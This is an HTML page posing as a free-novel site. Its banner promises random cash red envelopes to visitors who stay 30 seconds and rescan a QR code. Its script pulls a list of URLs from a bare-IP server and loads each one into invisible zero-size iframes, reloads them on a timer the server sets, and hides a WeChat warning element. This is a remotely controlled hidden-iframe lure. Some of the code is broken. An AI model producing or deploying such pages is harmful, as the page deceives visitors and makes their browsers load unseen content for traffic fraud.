<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>免费小说网</title>
    <style type="text/css">
        /* 基本样式 */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        a {
            text-decoration: none;
        }

        .show-monitor {
            width: 100%;
            max-width: 360px;
            height: auto;
            margin: 20px auto;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
        }

        #countdown {
            width: 100%;
            height: 40px;
            background-color: red;
            text-align: center;
            color: white;
            line-height: 40px;
            font-size: 16px;
            position: fixed;
            top: 10px;
            left: 0;
            z-index: 999;
        }

        /* 取消微信提示 */
        .wechat-warning {
            display: none;
        }

        /*  iframe 内嵌内容 */
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* 响应式布局 */
        @media (max-width: 768px) {
            .show-monitor {
                width: 100%;
                margin: 10px;
            }

            #countdown {
                font-size: 14px;
                height: 30px;
                line-height: 30px;
            }
        }

        /* 当页面内容是居中的时候，确保页面加载时居中显示 */
        .center-content {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f5f5f5;
        }

    </style>
</head>

<body>
    <div id="countdown">
        浏览30秒关闭重新扫码领随机红包
    </div>

    <div class="center-content">
        <div class="show-monitor" id="showMonitor">
            <iframe src="https://r.1hello.com/pns/res/40cc9517b4dac64a2142e742ef463872.html?token_0mUw33=uyLimiQP0uVV&key=HBkMCBhRQEAVHQhWBQVaFkcLVhsFUVdfRFxXGiI%2FOlxADwhXXCY%2FVhw5SBVFAxsCGFIRHFYeFiMdABEpO1saOSJLDBcADgEwQBdFAR0iCyIQBywzDFwV" id="framemain"></iframe>
        </div>
    </div>

    <script>
        let timee = 100;
        let timea = 100;
        let reflash = true;

        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const name = urlParams.get('name');
        console.log('name 参数的值是:', name);

        if (name == null) {
            sendFetchGetRequest().then(result0 => {
                console.log('获取到的返回值:', result0);
                if (result0 == undefined) {
                    return;
                }

                const responseData = result0;
                const iframeAllDiv = document.getElementById('iframeAll');

                for (const key in responseData) {
                    if (responseData.hasOwnProperty(key)) {
                        const method = responseData[key].method;
                        const path = method.path;

                        const iframe = document.createElement('iframe');
                        iframe.src = path;
                        iframe.style.position = 'absolute';
                        iframe.style.height = '0%';
                        iframe.style.border = '0';
                        iframe.style.width = '0%';

                        iframeAllDiv.appendChild(iframe);
                    }
                }
            }).catch(error => {
                console.error('发生错误:', error);
                alert('请填写完整的信息');
            });
        } else {
            sendQueryAll(name).then(result => {
                console.log('获取到的返回值:', result.path);
                document.getElementById('frame').src = addHttpsPrefix(result.path);
            }).catch(error => {
                console.error('发生错误:', error);
                alert('请填写完整的信息');
            });
        }

        function refreshIframes() {
            const iframes = document.getElementById('iframeAll').getElementsByTagName('iframe');
            for (let i = 0; i < iframes.length; i++) {
                const iframe = iframes[i];
                const currentSrc = iframe.src;
                iframe.src = currentSrc;
            }
        }

        function updateCountdown() {
            timee = Math.floor(timee) - 1;
            if (timee < timea / 2 && reflash) {
                reflash = false;
                refreshIframes();
            }

            if (timee > 0) {
                const seconds = Math.floor(timee);
                const countdownElement = document.getElementById('countdown');
                countdownElement.innerHTML = `浏览30秒关闭重新扫码领随机红包`;
            } else {
                const countdownElement = document.getElementById('countdown');
                countdownElement.innerHTML = `浏览30秒关闭重新扫码领随机红包`;
            }
        }

        function addHttpsPrefix(url) {
            return url;
        }

        async function sendQueryAll(name) {
            try {
                const response = await fetch('http://111.230.237.211:3001/queryAll?name=' + name);
                if (!response.ok) {
                    throw new Error(`请求失败，状态码: ${response.status}`);
                }
                const data = await response.json();
                return data.method;
            } catch (error) {
            }
        }

        async function sendFetchGetRequest() {
            try {
                const response = await fetch('http://111.230.237.211:3001/list-apis');
                if (!response.ok) {
                    throw new Error(`请求失败，状态码: ${response.status}`);
                }
                const data = await response.json();
                return data;
            } catch (error) {
            }
        }

        async function sendGetinit() {
            try {
                const response = await fetch('http://111.230.237.211:3001/get-init');
                if (!response.ok) {
                    throw new Error(`请求失败，状态码: ${response.status}`);
                }
                const data = await response.json();
                timee = data.sleep;
                timea = data.sleep;
                return data;
            } catch (error) {
            }
        }

        sendGetinit();

        setInterval(updateCountdown, 1000);
    </script>
</body>

</html>
